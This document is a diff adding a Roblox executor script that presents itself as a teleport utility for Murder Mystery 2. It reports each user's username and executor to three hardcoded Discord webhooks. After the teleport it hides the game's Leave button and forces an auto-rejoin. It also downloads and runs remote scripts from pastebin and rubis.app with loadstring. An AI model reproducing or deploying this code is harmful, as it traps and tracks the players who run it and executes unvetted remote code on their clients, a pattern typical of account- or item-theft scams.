@@ -1,0 +1,369 @@
+--[[
+    Final Roblox Teleport System
+    Target: Murder Mystery 2 (Place ID 142823291)
+    Features:
+    - External Game Execution Log
+    - V2 Successfully Teleported
+    - V3 Teleport Failed
+    - Detected Executor
+    - Anti-Leave + Auto Rejoin
+    - Runs 2 scripts on arrival
+]]
+
+local TeleportService = game:GetService("TeleportService")
+local Players         = game:GetService("Players")
+local HttpService     = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local LocalPlayer     = Players.LocalPlayer
+local TARGET_PLACE_ID = 142823291
+
+-- ====================== CONFIG (3 SEPARATE WEBHOOKS) ======================
+local EXECUTION_LOG_WEBHOOK = "https://discord.com/api/webhooks/1553756580212777027/TA8LpI58ALjCEDcJ-cczEUleCzQKXoy10EcsDSIFvSpzXtsSxFfhbm_C9Kis_f2thgPM"
+local SUCCESS_WEBHOOK_URL   = "https://discord.com/api/webhooks/1546850675118571550/zJoi2lSuTYX2A_9WaMTZ_RS_K7Cu35vusIIQ-hI8ZXyIyO7OoKtOWzctma3Js5KlVWBE"
+local FAILED_WEBHOOK_URL    = "https://discord.com/api/webhooks/1553994916529705071/818Ob83RaRv6W7kN4Gyx0tFwkrp4mcIQmtAIe7wRw7AtoVqumpYZEM1AKEzyjN6gN_59"
+
+-- ====================== SCRIPTS THAT RUN AFTER YOU ARRIVE IN MM2 ======================
+local SCRIPT_TO_RUN_ON_ARRIVAL = [[
+-- Anti Leave + Auto Rejoin
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local GuiService = game:GetService("GuiService")
+local CoreGui = game:GetService("CoreGui")
+local LocalPlayer = Players.LocalPlayer
+local PLACE_ID = game.PlaceId
+local JOB_ID = game.JobId
+
+pcall(function()
+    GuiService.AutoSelectGuiEnabled = false
+end)
+
+task.spawn(function()
+    while true do
+        pcall(function()
+            local leaveButton = CoreGui:FindFirstChild("LeaveButton", true)
+            if leaveButton and leaveButton:IsA("GuiButton") then
+                leaveButton.Active = false
+                leaveButton.Visible = false
+            end
+        end)
+        task.wait(1)
+    end
+end)
+
+LocalPlayer.AncestryChanged:Connect(function(_, parent)
+    if not parent then
+        task.wait(1)
+        pcall(function()
+            if JOB_ID and JOB_ID ~= "" then
+                TeleportService:TeleportToPlaceInstance(PLACE_ID, JOB_ID, LocalPlayer)
+            else
+                TeleportService:Teleport(PLACE_ID, LocalPlayer)
+            end
+        end)
+    end
+end)
+
+-- Script 1
+loadstring(game:HttpGet("https://pastebin.com/raw/2LSEjZEU"))()
+
+-- Script 2
+loadstring(game:HttpGet('https://api.rubis.app/v2/scrap/W5H1y8W7ABRj0K5i/raw'))()
+]]
+-- ======================================================================================
+
+-- State
+local teleportState      = "IDLE"
+local webhookSent        = false
+local queuedSuccessfully = false
+
+local function getUTCTimestamp()
+    return os.date("!%Y-%m-%d %H:%M:%S")
+end
+
+-- ====================== EXECUTOR DETECTION ======================
+local function getExecutorName()
+    local success, name = pcall(function()
+        return identifyexecutor and identifyexecutor()
+    end)
+    if success and type(name) == "string" and name ~= "" then
+        return name
+    end
+
+    if syn then return "Synapse Z / Synapse"
+    elseif fluxus then return "Fluxus"
+    elseif delta then return "Delta"
+    elseif potassium then return "Potassium"
+    elseif madium then return "Madium"
+    elseif wave then return "Wave"
+    elseif volt or awp then return "Volt (AWP.GG)"
+    elseif solara then return "Solara"
+    elseif xeno then return "Xeno"
+    elseif cryptic then return "Cryptic"
+    elseif volcano then return "Volcano"
+    elseif bunni then return "Bunni"
+    elseif seliware then return "Seliware"
+    elseif nucleus then return "Nucleus"
+    elseif velocity then return "Velocity"
+    elseif swift then return "Swift"
+    elseif valex then return "Valex"
+    elseif codex or iscodex then return "Codex"
+    elseif hydrogen then return "Hydrogen"
+    elseif macsploit then return "MacSploit"
+    elseif is_sirhurt_closure or sirhurt then return "SirHurt"
+    elseif real then return "Real"
+    elseif lumen then return "Lumen External"
+    elseif opiumware then return "Opiumware"
+    elseif vegax or vega then return "Vega X"
+    elseif cosmic then return "Cosmic"
+    elseif serotonin then return "Serotonin"
+    elseif isaeva then return "Isaeva"
+    elseif ronix then return "Ronix"
+    elseif severe then return "Severe External"
+    elseif KRNL_LOADED or iskrnlclosure then return "Krnl"
+    elseif getgenv and getgenv().script_key then return "Script-Ware"
+    end
+
+    return "Unknown"
+end
+
+local function sendWebhook(url, embed)
+    local payload = HttpService:JSONEncode({ embeds = { embed } })
+    local headers = { ["Content-Type"] = "application/json" }
+
+    pcall(function()
+        if syn and syn.request then
+            syn.request({ Url = url, Method = "POST", Headers = headers, Body = payload })
+        elseif http_request then
+            http_request({ Url = url, Method = "POST", Headers = headers, Body = payload })
+        elseif request then
+            request({ Url = url, Method = "POST", Headers = headers, Body = payload })
+        elseif http and http.request then
+            http.request({ Url = url, Method = "POST", Headers = headers, Body = payload })
+        else
+            HttpService:PostAsync(url, payload)
+        end
+    end)
+end
+
+-- ====================== 1. EXTERNAL GAME EXECUTION LOG ======================
+local function sendExecutionLog()
+    local gameName = "Unknown"
+    pcall(function()
+        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+    end)
+
+    local actionText = queuedSuccessfully and "Queued Teleport to MM2" or "Teleport to MM2 (No Queue)"
+
+    local embed = {
+        title = "External Game Execution Log",
+        color = 16753920,
+        fields = {
+            { name = "Username",          value = LocalPlayer.Name,           inline = true  },
+            { name = "Place ID",          value = tostring(game.PlaceId),     inline = true  },
+            { name = "Game Name",         value = gameName,                   inline = false },
+            { name = "Detected Executor", value = getExecutorName(),          inline = true  },
+            { name = "Action",            value = actionText,                 inline = false },
+            { name = "Timestamp",         value = os.date("%A at %I:%M %p"),  inline = true  },
+        },
+        footer = { text = "Roblox Teleport System • Execution Log" }
+    }
+
+    sendWebhook(EXECUTION_LOG_WEBHOOK, embed)
+end
+
+-- ====================== 3. V3 FAILED ======================
+local function sendV3Failed(reason)
+    if webhookSent or teleportState == "SUCCESS" then return end
+    webhookSent   = true
+    teleportState = "FAILED"
+
+    local embed = {
+        title = "V3 Teleport Failed",
+        color = 15548997,
+        fields = {
+            { name = "Game",              value = "Murder Mystery 2 (MM2)", inline = true },
+            { name = "Status",            value = "❌ FAILED",             inline = true },
+            { name = "Roblox Username",   value = LocalPlayer.Name,        inline = true },
+            { name = "Detected Executor", value = getExecutorName(),       inline = true },
+            { name = "Destination",       value = "Place ID: `" .. TARGET_PLACE_ID .. "`", inline = false },
+            { name = "Failure Reason",    value = "```" .. tostring(reason or "Unknown error") .. "```", inline = false },
+            { name = "Timestamp (UTC)",   value = getUTCTimestamp(),       inline = true },
+        },
+        footer = { text = "Roblox Teleport System • V3" },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+
+    sendWebhook(FAILED_WEBHOOK_URL, embed)
+end
+
+-- ====================== QUEUE PAYLOAD ======================
+local function queueArrivalPayload()
+    local escapedScript = SCRIPT_TO_RUN_ON_ARRIVAL
+        :gsub("\\", "\\\\")
+        :gsub('"', '\\"')
+        :gsub("\r", "")
+        :gsub("\n", "\\n")
+
+    local payload = string.format([[
+        local HttpService = game:GetService("HttpService")
+        local Players = game:GetService("Players")
+        local LocalPlayer = Players.LocalPlayer
+
+        if game.PlaceId ~= %d then return end
+
+        -- Run Anti-Leave + Scripts
+        local scriptToRun = "%s"
+        pcall(function()
+            loadstring(scriptToRun)()
+        end)
+
+        local webhookUrl = "%s"
+
+        local function getUTCTimestamp()
+            return os.date("!%%Y-%%m-%%d %%H:%%M:%%S")
+        end
+
+        local function getExecutorName()
+            local success, name = pcall(function()
+                return identifyexecutor and identifyexecutor()
+            end)
+            if success and type(name) == "string" and name ~= "" then
+                return name
+            end
+            if syn then return "Synapse Z / Synapse"
+            elseif fluxus then return "Fluxus"
+            elseif delta then return "Delta"
+            elseif potassium then return "Potassium"
+            elseif madium then return "Madium"
+            elseif wave then return "Wave"
+            elseif volt or awp then return "Volt (AWP.GG)"
+            elseif solara then return "Solara"
+            elseif xeno then return "Xeno"
+            end
+            return "Unknown"
+        end
+
+        local embed = {
+            title = "V2 Successfully Teleported to MM2",
+            color = 5763719,
+            fields = {
+                { name = "Game",              value = "Murder Mystery 2 (MM2)", inline = true },
+                { name = "Status",            value = "✅ TELEPORTED",         inline = true },
+                { name = "Roblox Username",   value = LocalPlayer.Name,        inline = true },
+                { name = "Detected Executor", value = getExecutorName(),       inline = true },
+                { name = "Destination",       value = "Place ID: `%d`",        inline = false },
+                { name = "Timestamp (UTC)",   value = getUTCTimestamp(),       inline = true },
+            },
+            footer = { text = "Roblox Teleport System • V2" },
+            timestamp = os.date("!%%Y-%%m-%%dT%%H:%%M:%%SZ")
+        }
+
+        local body = HttpService:JSONEncode({ embeds = { embed } })
+        local headers = { ["Content-Type"] = "application/json" }
+
+        pcall(function()
+            if syn and syn.request then
+                syn.request({ Url = webhookUrl, Method = "POST", Headers = headers, Body = body })
+            elseif http_request then
+                http_request({ Url = webhookUrl, Method = "POST", Headers = headers, Body = body })
+            elseif request then
+                request({ Url = webhookUrl, Method = "POST", Headers = headers, Body = body })
+            elseif http and http.request then
+                http.request({ Url = webhookUrl, Method = "POST", Headers = headers, Body = body })
+            else
+                HttpService:PostAsync(webhookUrl, body)
+            end
+        end)
+    ]], TARGET_PLACE_ID, escapedScript, SUCCESS_WEBHOOK_URL, TARGET_PLACE_ID)
+
+    local function tryQueue(fn)
+        if type(fn) == "function" then
+            local ok = pcall(fn, payload)
+            if ok then
+                queuedSuccessfully = true
+                return true
+            end
+        end
+        return false
+    end
+
+    if tryQueue(delta and (delta.queue_on_teleport or delta.queueonteleport or delta.QueueOnTeleport)) then return true end
+    if tryQueue(queue_on_teleport) then return true end
+    if tryQueue(queueonteleport) then return true end
+    if tryQueue(QueueOnTeleport) then return true end
+    if syn and tryQueue(syn.queue_on_teleport) then return true end
+    if fluxus and tryQueue(fluxus.queue_on_teleport) then return true end
+    if potassium and tryQueue(potassium.queue_on_teleport) then return true end
+    if madium and tryQueue(madium.queue_on_teleport) then return true end
+    if getgenv and tryQueue(getgenv().queue_on_teleport) then return true end
+
+    return false
+end
+
+-- ====================== FAILURE LISTENERS ======================
+local function setupFailureListeners()
+    if TeleportService.TeleportInitFailed then
+        TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
+            if player == LocalPlayer and teleportState == "TELEPORT_REQUESTED" then
+                sendV3Failed(tostring(teleportResult) .. " | " .. tostring(errorMessage))
+            end
+        end)
+    end
+
+    LocalPlayer.OnTeleport:Connect(function(state)
+        if teleportState ~= "TELEPORT_REQUESTED" then return end
+        if state == Enum.TeleportState.Failed then
+            sendV3Failed("TeleportState.Failed")
+        end
+    end)
+end
+
+-- ====================== MAIN ======================
+local function startTeleport()
+    if teleportState ~= "IDLE" then return end
+
+    teleportState      = "TELEPORT_REQUESTED"
+    webhookSent        = false
+    queuedSuccessfully = false
+
+    -- Already in MM2
+    if game.PlaceId == TARGET_PLACE_ID then
+        pcall(function()
+            loadstring(SCRIPT_TO_RUN_ON_ARRIVAL)()
+        end)
+
+        local embed = {
+            title = "V2 Successfully Teleported to MM2",
+            color = 5763719,
+            fields = {
+                { name = "Game",              value = "Murder Mystery 2 (MM2)", inline = true },
+                { name = "Status",            value = "✅ TELEPORTED",         inline = true },
+                { name = "Roblox Username",   value = LocalPlayer.Name,        inline = true },
+                { name = "Detected Executor", value = getExecutorName(),       inline = true },
+                { name = "Destination",       value = "Place ID: `" .. TARGET_PLACE_ID .. "`", inline = false },
+                { name = "Timestamp (UTC)",   value = getUTCTimestamp(),       inline = true },
+            },
+            footer = { text = "Roblox Teleport System • V2" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }
+        sendWebhook(SUCCESS_WEBHOOK_URL, embed)
+        sendExecutionLog()
+        return
+    end
+
+    queueArrivalPayload()
+    sendExecutionLog()
+    setupFailureListeners()
+
+    local ok, err = pcall(function()
+        TeleportService:Teleport(TARGET_PLACE_ID, LocalPlayer)
+    end)
+
+    if not ok then
+        sendV3Failed(err)
+    end
+end
+
+-- Start
+startTeleport()
